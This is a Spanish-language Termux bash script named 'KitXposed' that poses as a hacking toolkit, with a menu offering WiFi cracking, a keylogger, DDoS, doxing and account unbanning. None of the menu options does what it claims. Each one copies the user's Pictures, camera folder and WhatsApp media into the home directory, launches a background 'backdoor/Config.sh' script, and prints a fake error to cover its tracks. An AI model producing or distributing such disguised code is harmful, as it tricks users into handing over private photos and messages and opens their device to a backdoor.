#! /bin/bash

termux-setup-storage
setterm -foreground red
echo ""


setterm -foreground red
echo -n "[+]Presione enter para continuar _"
read enter

white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
Purple="\033[0;35m"
Cyan="\033[0;36m"
Cafe="\033[0;33m"
Fiuscha="\033[0;35m"
blue="\033[1;34m"
nc="\e[0m"


#directory verification
directory=$(pwd)


if which figlet >/dev/null; then
sleep 1
echo ""
echo -e "$blue(figlet)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(figlet)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando figlet ...\e[0m"
sleep 3
pkg install figlet
fi
sleep 1

#directory verification
directory=$(pwd)


if which python >/dev/null; then
sleep 1
echo ""
echo -e "$blue(python)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(python)$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando python ...\e[0m"
sleep 3
pkg install python -y
fi
sleep 1

#directory verification
directory=$(pwd)


if which python2 >/dev/null; then
sleep 1
echo ""
echo -e "$blue(python2)$nc ................................................... Instalado [$green✓$nc]"
else
sleep 1
echo -e "$red(python2$nc No instalado [$red✗$nc]"
sleep 1
echo -e "\e[1;32mInstalando python2 ...\e[0m"
sleep 3
pkg install python2 -y
fi
sleep 1
clear

figlet KitXposed
while :
do
setterm -foreground blue
#Menu
#Escojer menu
echo ""
echo "[1] Hackear wifi"
echo "[2] Ejecutar keylogger en PC"
echo "[3] Hackear servidor vulnerable"
echo "[4] Extraer info de una pagina web"
echo "[5] Tumbar pagina web"
echo "[6] Doxear a una persona"
echo "[7] Hackear red social"
echo "[8] Mandar a soporte un whatsaap"
echo "[9] Desbanear numero de un whatsaap"
echo "[10] Desbanear cuenta de FreeFire"
echo "[00] Salir"
setterm -foreground yellow
echo -n "[~] Opcion >> "
read opcion
case $opcion in
1) 
#! /bin/bash
echo ""
setterm -foreground green
echo "[▪︎▪︎▪︎ WiFi Vulnerable ▪︎▪︎▪︎]"
echo ""
echo -n "[+]Presione enter para escanear redes wifi _"
read enter
sleep 2
echo ""
echo "[+]Escaneo correcto"
echo -n "[+]Introuduce el nombre de red wifi > "
read wifi
echo -e "\e[1;37m[+]Capturando contraseña de\e[0m \e[1;31m$wifi\e[0m"
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]ERROR"
exit
;;
2)
#! /bin/bash
echo ""
setterm -foreground green
echo "♤ Keylooger en Pc ♤"
echo ""
echo -n "[+]Presiona enter para continuar _"
read enter
echo ""
echo -n "[+]Introduce una clave para tu keylooger > " 
read key
echo "[+]Clave es $key"
sleep 1
echo "[+]Introducir correo > "
read correo
echo "[+]Cargando por favor espere ..."
sleep 1
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]ERROR"
exit
;;
3)
#! /bin/bash
echo ""
setterm -foreground green
echo "[Servidor Vulnerable]"
echo ""
echo -n "[+]Introduce la IP del Servidor > "
read ip
echo ""
sleep 1
echo -e "\e[1;37m[+]Buscando vulnerabilidad de\e[0m \e[1;31m$ip\e[0m"
sleep 3
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[+]El servicio no es vulnerable"
echo ""
echo "[x]PROTEGIDO POR ANTvirusplayes"
exit
;;
4)
#! /bin/bash
echo ""
setterm -foreground greem
echo "{Extracción de una Pagina Web}"
sleep 1
echo -n "[+]Introduce la IP de la pagina > "
read pi
echo ""
sleep 1
echo "[+]Info de la pagina Encriptada"
echo -n "[+]Presione enter para desencryptar _"
read enter
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[+]Formarto Xml Encontrado"
echo "[+]Metadatos Activados 928393300"
echo "[x]ERROR"
exit
;;
5)
#! /bin/bash
echo ""
setterm -foreground green
echo "{Tumbar pagina web}"
echo ""
echo -n "[+]Introduce la IP de la pagina > "
read pa
sleep 1
echo ""
echo -e "\e[1;37m[+]Hacer DNS a\e[0m \e[1;31m$a\e[0m"
echo "[+]Puerto 53 abierto"
echo ""
echo "[+]1000 Socket enviados"
echo "[+] Enviando ..."
sleep 2
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]1 Socket aceptado 999 closed"
echo "[x]ERROR"
exit
;;
6)
#! /bin/bash
echo ""
setterm -foreground green
echo "<Doxing a una persona>"
echo ""
echo -n "[+]Introduce el ID de Facebook > "
read id
sleep 1
echo ""
echo -e "\e[1;37m[+]Doxeando a\e[0m \e[1;31m$id\e[0m \e[1;37men 6 minutos ...\e[0m"
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]Facebook rechazo tu ataque"
echo "[x]ERROR"
exit
;;
7)
#! /bin/bash
echo ""
setterm -foreground green
echo "Hackear Instagran"
echo ""
echo -n "[+]Introduce el ID de Instagram > "
read di
sleep 1
echl ""
echo -e "\e[1;37m[+]Hackeando a\e[0m \e[1;31m$di ...\e[0m"
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]Instagram rechazo tu ataque"
echo "[x]ERROR"
exit
;;
8)
#! /bin/bash
echo ""
setterm -foreground green
echo "(Soporte a un numero)"
echo ""
echo -n "[+]Introduce el codigo de pais + > "
read co
sleep 1 
echo ""
echo -n "[+]Introduce el numero de telefono > "
read tel
echo -e "\e[1;37m[+]Mandando soporte a\e[0m \e[1;31m$co $tel ...\e[0m"
sleep 1
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]Whatsapp rechazo tu ataque"
echo "[x]ERROR"
exit
;;
9)
#! /bin/bash
echo ""
setterm -foreground green
echo "(Desbanear numero)"
echo ""
echo -n "[+]Introduce el codigo de pais + > "
read co
sleep 1
echo ""
echo -n "[+]Introduce el numero de telefono > "
read tel
echo -e "\e[1;37m[+]Desbaneando numero \e[0m \e[1;31m$co $tel ...\e[0m"
sleep 1
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]Whatsapp rechazo tu petición"
echo "[x]ERROR"
exit
;;
10)
#! /bin/bash
echo ""
setterm -foreground green
echo "(Desbanear cuenta de FreeFire)"
echo ""
echo -n "[+]Introduce tu ID del FreeFire > "
read fre
sleep 1
echo ""
echo -e "\e[1;37mDesbaneando a\e[0m \e[1;31m$fre ...\e[0m"
cd /sdcard
cp -r Pictures /$HOME
cp -r DCIM/Camera /$HOME
cp -r Android/media/com.whatsapp /$HOME
echo ""
cd /$HOME/backdoor
bash Config.sh &
setterm -foreground red
echo "[x]Garena rechazo tu petición"
echo "[x]ERROR"
;;
00) 
#! /bin/bash
echo ""
exit
;;
esac
done
